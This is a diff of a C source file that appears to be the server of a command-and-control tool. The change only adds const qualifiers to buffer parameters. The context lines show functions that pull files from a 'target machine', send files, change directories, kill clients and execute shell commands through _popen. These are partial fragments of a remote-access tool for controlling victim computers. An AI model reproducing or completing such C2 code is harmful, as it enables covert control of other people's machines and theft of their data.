@@ -123,7 +123,7 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 }
 
 // Function to read/store stdin until \n is detected.
-size_t get_line(char* buf) {
+size_t get_line(char* const buf) {
 	char c;
 	size_t cmd_len = 0;
 
@@ -166,7 +166,7 @@ void list_connections(Conn_array* conns) {
 }
 
 // Function to receive file from target machine (TCP file transfer).
-int send_file(char* buf, size_t cmd_len, SOCKET client_socket) {
+int send_file(char* const buf, size_t cmd_len, SOCKET client_socket) {
 	// Send command to the client to be parsed.
 	buf[7] = '3';
 	if (send(client_socket, &buf[7], cmd_len, 0) < 1)
@@ -213,7 +213,7 @@ int send_file(char* buf, size_t cmd_len, SOCKET client_socket) {
 }
 
 // Function to copy int bytes to new memory block/location to abide strict aliasing.
-inline uint32_t ntohl_conv(char const* num) {
+inline uint32_t ntohl_conv(char* const num) {
 	uint32_t new;
 	memcpy(&new, num, sizeof(new));
 
@@ -222,7 +222,7 @@ inline uint32_t ntohl_conv(char const* num) {
 }
 
 // Function to receive file from target machine (TCP file transfer).
-int recv_file(char* buf, size_t cmd_len, SOCKET client_socket) {
+int recv_file(char* const buf, size_t cmd_len, SOCKET client_socket) {
 	// Send command to the client to be parsed.
 	buf[9] = '4';
 	if (send(client_socket, &buf[9], cmd_len, 0) < 1)
@@ -251,7 +251,7 @@ int recv_file(char* buf, size_t cmd_len, SOCKET client_socket) {
 }
 
 // Function send change directory command to client.
-int client_cd(char* buf, size_t cmd_len, SOCKET client_socket) {
+int client_cd(char* const buf, size_t cmd_len, SOCKET client_socket) {
 	buf[3] = '1';
 	if (send(client_socket, &buf[3], cmd_len, 0) < 1)
 		return SOCKET_ERROR;
@@ -260,14 +260,14 @@ int client_cd(char* buf, size_t cmd_len, SOCKET client_socket) {
 }
 
 // Function to terminate/kill client.
-int terminate_client(char* buf, size_t cmd_len, SOCKET client_socket) {
+int terminate_client(char* const buf, size_t cmd_len, SOCKET client_socket) {
 	send(client_socket, "2", cmd_len, 0);
 
 	return 0;
 }
 
 // Function to return function pointer based on parsed command.
-func parse_cmd(char* buf) {
+func parse_cmd(char* const buf) {
 	// Function pointer array of each c2 command.
 	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
 	// Array of strings to be parsed.
@@ -283,7 +283,7 @@ func parse_cmd(char* buf) {
 }
 
 // Function to send command to client.
-int send_cmd(char* buf, size_t cmd_len, SOCKET client_socket) {
+int send_cmd(char* const buf, size_t cmd_len, SOCKET client_socket) {
 	// Send command to server.
 	if (send(client_socket, buf, cmd_len, 0) < 1)
 		return SOCKET_ERROR;
@@ -320,7 +320,7 @@ void resize_conns(Conn_array* conns, int client_id) {
 }
 
 // Function to parse interactive input and send to specified client.
-void interact(Conn_array* conns, char* buf, int client_id) {
+void interact(Conn_array* conns, char* const buf, int client_id) {
 	SOCKET client_socket = conns->clients[client_id].sock;
 	char* client_host = conns->clients[client_id].host;
 
@@ -359,7 +359,7 @@ void interact(Conn_array* conns, char* buf, int client_id) {
 }
 
 // Function to execute command.
-void exec_cmd(char* buf) {
+void exec_cmd(char* const buf) {
 	// Call Popen to execute command(s) and read the process' output.
 	FILE* fpipe = _popen(buf, "r");
 	fseek(fpipe, 0, SEEK_END);
